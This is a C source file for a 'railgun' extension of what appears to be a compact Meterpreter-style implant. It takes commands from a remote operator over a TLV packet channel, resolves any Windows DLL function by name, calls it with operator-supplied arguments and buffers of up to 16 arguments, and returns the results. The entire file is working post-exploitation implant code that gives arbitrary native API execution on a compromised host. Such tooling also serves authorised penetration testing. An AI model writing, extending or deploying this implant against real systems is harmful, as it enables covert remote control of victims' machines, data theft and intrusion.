#include "meterpreter_micro.h"
#include "micro_runtime.h"
#include "micro_stdapi.h"

#define MICRO_RAILGUN_MAX_ARGUMENTS 16
#define MICRO_RAILGUN_MAX_BUFFER (16 * 1024 * 1024)

typedef ULONG_PTR(WINAPI* RailgunFunction)();

static MetApi* railgun_api;

static BOOL railgun_raw_tlv(Packet* packet, TlvType type, Tlv* value)
{
	return railgun_api->packet.get_tlv(packet, type, value) == ERROR_SUCCESS && value->header.length <= MICRO_RAILGUN_MAX_BUFFER;
}

static BOOL railgun_pointer(ULONG_PTR base, SIZE_T size, ULONG_PTR offset, ULONG_PTR* result)
{
	if ((size == 0 && offset != 0) || (size > 0 && offset >= size))
	{
		return FALSE;
	}
	*result = base + offset;
	return TRUE;
}

static BOOL railgun_prepare_stack(const Tlv* descriptors, const Tlv* input, const Tlv* inout, BYTE* output, SIZE_T output_size, ULONG_PTR* stack, DWORD* argument_count)
{
	DWORD index;
	if (descriptors->header.length % (2 * sizeof(ULONG_PTR)) != 0)
	{
		return FALSE;
	}

	*argument_count = descriptors->header.length / (2 * sizeof(ULONG_PTR));
	if (*argument_count > MICRO_RAILGUN_MAX_ARGUMENTS)
	{
		return FALSE;
	}

	for (index = 0; index < *argument_count; index++)
	{
		ULONG_PTR kind;
		ULONG_PTR value;
		micro_copy(&kind, descriptors->buffer + index * 2 * sizeof(ULONG_PTR), sizeof(kind));
		micro_copy(&value, descriptors->buffer + (index * 2 + 1) * sizeof(ULONG_PTR), sizeof(value));

		switch (kind)
		{
			case 0:
				stack[index] = value;
				break;
			case 1:
				if (!railgun_pointer((ULONG_PTR)input->buffer, input->header.length, value, &stack[index]))
				{
					return FALSE;
				}
				break;
			case 2:
				if (!railgun_pointer((ULONG_PTR)output, output_size, value, &stack[index]))
				{
					return FALSE;
				}
				break;
			case 3:
				if (!railgun_pointer((ULONG_PTR)inout->buffer, inout->header.length, value, &stack[index]))
				{
					return FALSE;
				}
				break;
			default:
				return FALSE;
		}
	}
	return TRUE;
}

static QWORD railgun_call(RailgunFunction function, const ULONG_PTR* argument)
{
	switch (argument[16])
	{
		case 0: return function();
		case 1: return function(argument[0]);
		case 2: return function(argument[0], argument[1]);
		case 3: return function(argument[0], argument[1], argument[2]);
		case 4: return function(argument[0], argument[1], argument[2], argument[3]);
		case 5: return function(argument[0], argument[1], argument[2], argument[3], argument[4]);
		case 6: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5]);
		case 7: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6]);
		case 8: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7]);
		case 9: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8]);
		case 10: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9]);
		case 11: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10]);
		case 12: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10], argument[11]);
		case 13: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10], argument[11], argument[12]);
		case 14: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10], argument[11], argument[12], argument[13]);
		case 15: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10], argument[11], argument[12], argument[13], argument[14]);
		case 16: return function(argument[0], argument[1], argument[2], argument[3], argument[4], argument[5], argument[6], argument[7], argument[8], argument[9], argument[10], argument[11], argument[12], argument[13], argument[14], argument[15]);
		default: return (QWORD)-1;
	}
}

static DWORD railgun_request(Remote* remote, Packet* packet)
{
	Packet* response = railgun_api->packet.create_response(packet);
	const char* library_name;
	const char* function_name;
	const char* call_convention;
	RailgunFunction function;
	Tlv input = { 0 };
	Tlv inout = { 0 };
	Tlv descriptors = { 0 };
	ULONG_PTR stack[MICRO_RAILGUN_MAX_ARGUMENTS + 1];
	BYTE* output = NULL;
	DWORD output_size;
	DWORD argument_count;
	DWORD native_error;
	QWORD return_value;
	DWORD result = ERROR_INVALID_PARAMETER;

	if (response == NULL)
	{
		return ERROR_INVALID_HANDLE;
	}

	output_size = railgun_api->packet.get_tlv_value_uint(packet, TLV_TYPE_RAILGUN_SIZE_OUT);
	library_name = railgun_api->packet.get_tlv_value_string(packet, TLV_TYPE_RAILGUN_DLLNAME);
	function_name = railgun_api->packet.get_tlv_value_string(packet, TLV_TYPE_RAILGUN_FUNCNAME);
	call_convention = railgun_api->packet.get_tlv_value_string(packet, TLV_TYPE_RAILGUN_CALLCONV);
	if (output_size > MICRO_RAILGUN_MAX_BUFFER || library_name == NULL || function_name == NULL || (call_convention != NULL && !micro_string_equal(call_convention, "stdcall") && !micro_string_equal(call_convention, "cdecl")))
	{
		goto finish;
	}
#ifndef _WIN64
	if (call_convention != NULL && micro_string_equal(call_convention, "cdecl"))
	{
		result = ERROR_NOT_SUPPORTED;
		goto finish;
	}
#endif
	if (!railgun_raw_tlv(packet, TLV_TYPE_RAILGUN_BUFFERBLOB_IN, &input) || !railgun_raw_tlv(packet, TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT, &inout) || !railgun_raw_tlv(packet, TLV_TYPE_RAILGUN_STACKBLOB, &descriptors))
	{
		goto finish;
	}
	if (input.header.length > MICRO_RAILGUN_MAX_BUFFER - inout.header.length || input.header.length + inout.header.length > MICRO_RAILGUN_MAX_BUFFER - output_size)
	{
		goto finish;
	}

	if (output_size > 0)
	{
		output = (BYTE*)micro_alloc(railgun_api, output_size);
		if (output == NULL)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			goto finish;
		}
	}

	function = (RailgunFunction)micro_resolve(railgun_api, library_name, function_name);
	if (function == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
		goto finish;
	}
	if (!railgun_prepare_stack(&descriptors, &input, &inout, output, output_size, stack, &argument_count))
	{
		goto finish;
	}

	stack[16] = argument_count;
	micro_set_last_error(ERROR_SUCCESS);
	return_value = railgun_call(function, stack);
	native_error = micro_last_error();
	railgun_api->packet.add_tlv_uint(response, TLV_TYPE_RAILGUN_BACK_ERR, native_error);
	railgun_api->packet.add_tlv_qword(response, TLV_TYPE_RAILGUN_BACK_RET, return_value);
	railgun_api->packet.add_tlv_raw(response, TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT, output, output_size);
	railgun_api->packet.add_tlv_raw(response, TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT, inout.buffer, inout.header.length);
	railgun_api->packet.add_tlv_string(response, TLV_TYPE_RAILGUN_BACK_MSG, native_error == ERROR_SUCCESS ? "The operation completed successfully." : "Native function returned an error.");
	result = ERROR_SUCCESS;

finish:
	result = railgun_api->packet.transmit_response(result, remote, response);
	micro_free(railgun_api, output);
	return result;
}

static BOOL railgun_request_inline(Remote* remote, Packet* packet, DWORD* result)
{
	*result = railgun_request(remote, packet);
	return TRUE;
}

static Command railgun_commands[] =
{
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_RAILGUN_API, railgun_request_inline),
	COMMAND_TERMINATOR
};

static MicroExtension railgun_extension =
{
	sizeof(MicroExtension),
	MICRO_EXTENSION_ABI_VERSION,
	"micro-stdapi-railgun-api",
	1,
	railgun_commands,
	MICRO_EXTENSION_FLAG_INLINE_HANDLERS
};

const MicroExtension* micro_init(MetApi* api, Remote* remote)
{
	(void)remote;
	if (api == NULL || api->packet.create_response == NULL || api->packet.get_tlv == NULL || api->packet.get_tlv_value_uint == NULL || api->packet.get_tlv_value_string == NULL || api->packet.add_tlv_uint == NULL || api->packet.add_tlv_qword == NULL || api->packet.add_tlv_raw == NULL || api->packet.add_tlv_string == NULL || api->packet.transmit_response == NULL)
	{
		return NULL;
	}

	railgun_api = api;
	return &railgun_extension;
}

DWORD micro_deinit(Remote* remote)
{
	(void)remote;
	railgun_api = NULL;
	return ERROR_SUCCESS;
}
